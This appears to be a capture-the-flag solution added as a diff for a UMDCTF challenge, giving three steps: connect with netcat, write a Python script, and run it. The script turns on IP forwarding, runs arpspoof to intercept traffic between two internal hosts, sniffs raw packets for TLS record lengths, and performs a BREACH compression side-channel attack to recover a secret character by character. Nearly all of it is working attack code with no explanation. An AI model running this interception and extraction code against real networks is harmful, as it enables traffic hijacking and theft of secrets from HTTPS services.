@@ -1,0 +1,100 @@
+Step 1: nc challs.umdctf.io 31337
+
+Step 2 :
+cat << 'EOF' > /tmp/solve.py
+import socket, struct, threading, time, urllib.request, json, os, subprocess, ssl, sys, warnings
+warnings.filterwarnings("ignore")
+
+ADMIN_IP, SERVER_IP, SERVER_PORT = "10.0.0.1", "10.0.0.2", 443
+IFACE = "eth0"
+for line in os.popen("ip -o -4 addr show").read().splitlines():
+    if "10.0.0.3" in line:
+        IFACE = line.split()[1].split("@")[0]
+        break
+
+print(f"[*] Using interface: {IFACE}")
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
+subprocess.Popen(["/usr/sbin/arpspoof", "-i", IFACE, "-t", ADMIN_IP, SERVER_IP], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+subprocess.Popen(["/usr/sbin/arpspoof", "-i", IFACE, "-t", SERVER_IP, ADMIN_IP], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+tls_lengths =[]
+sniff_lock = threading.Lock()
+
+def sniffer():
+    try:
+        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
+    except Exception as e:
+        print(f"[-] Raw socket error: {e}")
+        sys.exit(1)
+    while True:
+        try:
+            packet = s.recvfrom(65565)[0]
+            if len(packet) < 34: continue
+            iph = struct.unpack('!BBHHHBBH4s4s', packet[14:34])
+            if iph[6] != 6: continue
+            if socket.inet_ntoa(iph[8]) == SERVER_IP and socket.inet_ntoa(iph[9]) == ADMIN_IP:
+                ihl = (iph[0] & 0xF) * 4
+                tcph = struct.unpack('!HHLLBBHHH', packet[14+ihl : 14+ihl+20])
+                if tcph[0] == SERVER_PORT:
+                    tcph_length = (tcph[4] >> 4) * 4
+                    payload = packet[14+ihl+tcph_length:]
+                    i = 0
+                    while i + 5 <= len(payload):
+                        length = struct.unpack('!H', payload[i+3:i+5])[0]
+                        if payload[i] == 23:
+                            with sniff_lock: tls_lengths.append(length)
+                        i += 5 + length
+        except: pass
+
+threading.Thread(target=sniffer, daemon=True).start()
+
+def measure_size(guess):
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    url = f"https://{SERVER_IP}:{SERVER_PORT}/api/suggestions"
+    req = urllib.request.Request(url, data=json.dumps({"filter": guess}).encode(), headers={"Content-Type": "application/json"})
+    while True:
+        try: urllib.request.urlopen(req, context=ctx, timeout=2)
+        except:
+            time.sleep(0.5)
+            continue
+        time.sleep(0.1)
+        with sniff_lock: tls_lengths.clear()
+        time.sleep(0.25)
+        with sniff_lock:
+            if tls_lengths: return min(tls_lengths)
+
+known = "UMDCTF{"
+charset = "abcdefghijklmnopqrstuvwxyz0123456789_}"
+print("[*] Waiting for ARP spoofing...")
+time.sleep(2)
+print("[*] Starting BREACH attack...")
+
+while True:
+    sizes = {}
+    for c in charset:
+        sizes[c] = measure_size(known + c)
+        sys.stdout.write(f"\rTesting: {known}{c} (size: {sizes[c]})   ")
+        sys.stdout.flush()
+    sys.stdout.write("\n")
+    min_sz = min(sizes.values())
+    candidates =[c for c, sz in sizes.items() if sz == min_sz]
+    
+    if len(candidates) == 1:
+        best_c = candidates[0]
+        print(f"[*] Best match: {best_c} (size: {min_sz})")
+    else:
+        scores = {c: 0 for c in candidates}
+        for pad in["A", "AA", "AAA", "AAAA"]:
+            for c in candidates: scores[c] += measure_size(pad + known + c)
+        best_c = min(candidates, key=lambda c: scores[c])
+        print(f"[*] Tie-breaker winner: {best_c}")
+        
+    known += best_c
+    if best_c == '}': break
+
+print(f"\n[!] Flag extracted: {known}")
+EOF
+
+Step 3: python3 /tmp/solve.py
